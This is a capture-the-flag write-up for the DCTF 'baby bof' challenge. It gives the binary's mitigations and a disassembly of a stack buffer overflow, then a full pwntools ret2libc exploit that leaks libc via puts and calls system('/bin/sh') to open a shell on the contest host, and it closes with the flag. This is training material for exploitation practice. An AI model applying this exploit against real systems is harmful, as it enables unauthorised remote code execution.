# Pwn sanity check

It's just another bof.
nc dctf-chall-baby-bof.westeurope.azurecontainer.io 7481

## Challenge

Simple buffer overflow and ret2libc problem.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Buffer Overflow

```asm
[0x004004d0]> pdf @ sym.vuln
            ; CALL XREF from main @ 0x40060a
┌ 59: sym.vuln ();
│           ; var char *s @ rbp-0xa
│           0x004005b7      55             push rbp
│           0x004005b8      4889e5         mov rbp, rsp
│           0x004005bb      4883ec10       sub rsp, 0x10
│           0x004005bf      488d3dde0000.  lea rdi, str.plz_dont_rop_me ; 0x4006a4 ; "plz don't rop me" ; const char *s                                                                                                           
│           0x004005c6      e8d5feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004005cb      488b156e0a20.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END__
│                                                                      ; [0x601040:8]=0 ; FILE *stream
│           0x004005d2      488d45f6       lea rax, [s]
│           0x004005d6      be00010000     mov esi, 0x100              ; 256 ; int size
│           0x004005db      4889c7         mov rdi, rax                ; char *s
│           0x004005de      e8ddfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)                                                                                                             
│           0x004005e3      488d3dcb0000.  lea rdi, str.i_dont_think_this_will_work ; 0x4006b5 ; "i don't think this will work" ; const char *s                                                                                   
│           0x004005ea      e8b1feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004005ef      90             nop
│           0x004005f0      c9             leave
└           0x004005f1      c3             ret
```

## Solution

We can overflow the buffer to overwrite the saved return address.

From here, we can leak the address of libc by calling `puts` on the GOT entry for `puts`.
Afterwards, we return to the vulnerable function so we can write a second payload.

With the address of libc, we can overflow the buffer again and call `system("/bin/sh")` to spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf-chall-baby-bof.westeurope.azurecontainer.io --port 7481 baby_bof
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('baby_bof')
libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf-chall-baby-bof.westeurope.azurecontainer.io'
port = int(args.PORT or 7481)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

plt = exe.plt["puts"]
got = exe.got["puts"]
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

vuln = 0x004005b7

payload = flat({
    0xa + 0x8: [
        poprdi,
        got,
        plt,
        vuln,
        ],
    })

io.sendline(payload)
io.recvuntil("work\n")

leak = u64(io.recvuntil("\n", drop=True).ljust(8, "\x00"))
libc.address = leak - libc.sym["puts"]
io.success(hex(libc.address))

payload = flat({
    0xa + 0x8: [
        ret,
        poprdi,
        next(libc.search("/bin/sh\x00")),
        libc.sym["system"],
        ],
    })

io.sendline(payload)
io.recvuntil("work\n")

io.interactive()
```

## Flag

`dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}`

